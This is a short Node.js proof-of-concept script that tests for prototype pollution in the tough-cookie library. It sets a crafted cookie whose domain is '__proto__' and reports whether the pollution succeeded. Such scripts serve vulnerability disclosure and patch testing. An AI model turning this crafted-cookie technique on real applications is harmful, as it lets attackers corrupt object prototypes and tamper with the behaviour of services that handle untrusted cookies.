const tough = require("tough-cookie");

const jar = new tough.CookieJar({ rejectPublicSuffixes: false });

// Create the malicious cookie with the dangerous domain `__proto__`
const cookieStr = "domain=__proto__; path=/hacked";
const cookie = tough.Cookie.parse(cookieStr);

// Set the cookie and check if prototype pollution is successful
jar.setCookie(cookie, "https://url/", (error) => {
  if (error) {
    console.log("Error setting cookie:", error);
    return;
  }

  // Check if prototype pollution occurred
  if ({}.hasOwnProperty.call(global, "/hacked")) {
    console.log("EXPLOITED SUCCESSFULLY");
  } else {
    console.log("EXPLOIT FAILED");
  }
});
